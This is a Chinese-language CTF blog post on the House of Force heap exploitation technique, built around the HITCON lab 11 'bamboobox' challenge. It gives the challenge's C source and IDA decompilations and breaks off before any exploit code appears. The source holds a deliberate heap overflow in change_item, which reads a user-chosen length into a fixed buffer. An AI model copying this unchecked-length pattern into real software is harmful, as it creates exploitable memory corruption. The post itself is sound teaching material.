<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>House of Force | Ky不是枕木</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Ky不是枕木" type="application/atom+xml">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>House of Force</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-09-12T15:14:29.000Z" id="date"> 2023-09-12</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-09-13T07:29:40.853Z" id="updated"> 2023-09-13</time></div></span><br><span>Word Count: <div class="control">3.6k</div></span><br><span>Read Time: <div class="control">20 min</div></span></div></div><hr><div id="post-content"><h1 id="House-Of-Force（控制top-chunk）（基础）"><a href="#House-Of-Force（控制top-chunk）（基础）" class="headerlink" title="House Of Force（控制top_chunk）（基础）"></a>House Of Force（控制top_chunk）（基础）</h1><blockquote>
<p>参考资料：<br>CTF-wiki：<a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a><br>附件下载：<br>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA">https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA</a>  密码: np57<br>–来自百度网盘超级会员V3的分享<br>    House Of Force是一种堆的利用方法，其主要原理是控制heap中的top_chunk并malloc来达到控制任意内存的空间。</p>
</blockquote>
<blockquote>
<p>题目来源：HITCON training lab 11<br>附件：<br>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1qdOlp9RT_7mxhw_187ugXQ">https://pan.baidu.com/s/1qdOlp9RT_7mxhw_187ugXQ</a>  密码: abtk<br>–来自百度网盘超级会员V3的分享</p>
</blockquote>
<hr>
<h2 id="Linux环境"><a href="#Linux环境" class="headerlink" title="Linux环境"></a>Linux环境</h2><p>老规矩，checksec一下文件先</p>
<p class='item-img' data-src='https://s2.loli.net/2023/09/12/Pph1H9f6lM5enLQ.png'><img src="https://s2.loli.net/2023/09/12/Pph1H9f6lM5enLQ.png" alt="Snipaste_2023-09-12_17-08-13.png"></p>
<p>计算一下 main_arena 距离 libc 的距离</p>
<p class='item-img' data-src='https://s2.loli.net/2023/09/12/xrSK93Ij7bPctEV.png'><img src="https://s2.loli.net/2023/09/12/xrSK93Ij7bPctEV.png" alt="Snipaste_2023-09-12_20-25-47.png"></p>
<h2 id="程序源代码-c"><a href="#程序源代码-c" class="headerlink" title="程序源代码(c)"></a>程序源代码(c)</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span> {</span><br>  <span class="hljs-type">int</span> size;<br>  <span class="hljs-type">char</span> *name;<br>};<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span> <span class="hljs-title">itemlist</span>[100] =</span> {<span class="hljs-number">0</span>};<br><br><span class="hljs-type">int</span> num;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hello_message</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"There is a box with magic"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"what do you want to do in the box"</span>);<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">goodbye_message</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"See you next time"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Thanks you"</span>);<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">box</span> {</span><br>  <span class="hljs-type">void</span> (*hello_message)();<br>  <span class="hljs-type">void</span> (*goodbye_message)();<br>};<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Bamboobox Menu"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"1.show the items in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"2.add a new item"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"3.change the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"4.remove the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"5.exit"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice:"</span>);<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show_item</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-keyword">if</span> (!num) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {<br>      <span class="hljs-keyword">if</span> (itemlist[i].name) {<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d : %s"</span>, i, itemlist[i].name);<br>      }<br>    }<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">""</span>);<br>  }<br>}<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">add_item</span><span class="hljs-params">()</span> {<br><br>  <span class="hljs-type">char</span> sizebuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> length;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">int</span> size;<br>  <span class="hljs-keyword">if</span> (num &lt; <span class="hljs-number">100</span>) {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>);<br>    read(<span class="hljs-number">0</span>, sizebuf, <span class="hljs-number">8</span>);<br>    length = atoi(sizebuf);<br>    <span class="hljs-keyword">if</span> (length == <span class="hljs-number">0</span>) {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild length"</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    }<br>   	<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {<br>      <span class="hljs-keyword">if</span> (!itemlist[i].name) {<br>        itemlist[i].size = length;<br>        itemlist[i].name = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(length);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the name of item:"</span>);<br>        size = read(<span class="hljs-number">0</span>, itemlist[i].name, length);<br>        itemlist[i].name[size] = <span class="hljs-string">'\x00'</span>;<br>        num++;<br>        <span class="hljs-keyword">break</span>;<br>      }<br>    }<br><br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"the box is full"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">change_item</span><span class="hljs-params">()</span> {<br><br>  <span class="hljs-type">char</span> indexbuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">char</span> lengthbuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> length;<br>  <span class="hljs-type">int</span> index;<br>  <span class="hljs-type">int</span> readsize;<br><br>  <span class="hljs-keyword">if</span> (!num) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    read(<span class="hljs-number">0</span>, indexbuf, <span class="hljs-number">8</span>);<br>    index = atoi(indexbuf);<br>    <span class="hljs-keyword">if</span> (itemlist[index].name) {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>);<br>      read(<span class="hljs-number">0</span>, lengthbuf, <span class="hljs-number">8</span>);<br>      length = atoi(lengthbuf);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the new name of the item:"</span>);<br>      readsize = read(<span class="hljs-number">0</span>, itemlist[index].name, length);<br>      *(itemlist[index].name + readsize) = <span class="hljs-string">'\x00'</span>;<br>    } <span class="hljs-keyword">else</span> {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>}<br><span class="hljs-type">void</span> <span class="hljs-title function_">remove_item</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">char</span> indexbuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> index;<br><br>  <span class="hljs-keyword">if</span> (!num) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    read(<span class="hljs-number">0</span>, indexbuf, <span class="hljs-number">8</span>);<br>    index = atoi(indexbuf);<br>    <span class="hljs-keyword">if</span> (itemlist[index].name) {<br>      <span class="hljs-built_in">free</span>(itemlist[index].name);<br>      itemlist[index].name = <span class="hljs-number">0</span>;<br>      itemlist[index].size = <span class="hljs-number">0</span>;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"remove successful!!"</span>);<br>      num--;<br>    } <span class="hljs-keyword">else</span> {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">magic</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> fd;<br>  <span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];<br>  fd = open(<span class="hljs-string">"./flag"</span>, O_RDONLY);<br>  read(fd, buffer, <span class="hljs-keyword">sizeof</span>(buffer));<br>  close(fd);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s"</span>, buffer);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>}<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {<br><br>  <span class="hljs-type">char</span> choicebuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> choice;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">box</span> *<span class="hljs-title">bamboo</span>;</span><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  bamboo = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> box));<br>  bamboo-&gt;hello_message = hello_message;<br>  bamboo-&gt;goodbye_message = goodbye_message;<br>  bamboo-&gt;hello_message();<br><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {<br>    menu();<br>    read(<span class="hljs-number">0</span>, choicebuf, <span class="hljs-number">8</span>);<br>    choice = atoi(choicebuf);<br>    <span class="hljs-keyword">switch</span> (choice) {<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      show_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      add_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      change_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>      remove_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>      bamboo-&gt;goodbye_message();<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild choice!!!"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    }<br>  }<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>



<h2 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a><strong>IDA静态分析</strong></h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>{<br>  <span class="hljs-type">void</span> (**v4)(<span class="hljs-type">void</span>); <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  v4 = (<span class="hljs-type">void</span> (**)(<span class="hljs-type">void</span>))<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>uLL);<br>  *v4 = (<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))hello_message;<br>  v4[<span class="hljs-number">1</span>] = (<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))goodbye_message;<br>  (*v4)();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    menu();<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    <span class="hljs-keyword">switch</span> ( atoi(buf) )<br>    {<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        show_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        add_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        change_item(buf, buf);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        remove_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        v4[<span class="hljs-number">1</span>]();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild choice!!!"</span>);<br>        <span class="hljs-keyword">break</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>​	main函数其实没有什么好说的，但是值得注意的是程序开头就申请了一片堆空间来存放hello_message和goodbye_message，并在程序开始的时候调用hello_message和在程序结束的时候调用goodbye_message。</p>
<h3 id="meau函数"><a href="#meau函数" class="headerlink" title="meau函数"></a>meau函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Bamboobox Menu"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"1.show the items in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"2.add a new item"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"3.change the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"4.remove the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"5.exit"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice:"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>这是一个程序的菜单函数，没有什么特别的。</p>
<h3 id="show-item"><a href="#show-item" class="headerlink" title="show_item"></a>show_item</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">show_item</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">if</span> ( !num )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">99</span>; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( itemlist[i].content )<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d : %s"</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)i, itemlist[i].content);	<span class="hljs-comment">//老老实实打印堆块的内容</span><br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(byte_401089);<br>}<br></code></pre></td></tr></tbody></table></figure>



<p>首先判断存放于bss段的全局变量num是否有数据，然后进入循环打印程序各个结构体的内容，没有什么好看的。</p>
<h3 id="add-item"><a href="#add-item" class="headerlink" title="add_item"></a>add_item</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">add_item</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( num &gt; <span class="hljs-number">99</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"the box is full"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);							<br>    v2 = atoi(buf);									<span class="hljs-comment">//输入准备输入内容的长度</span><br>    <span class="hljs-keyword">if</span> ( !v2 )<br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild length"</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    }<br>    <span class="hljs-keyword">for</span> ( i = <span 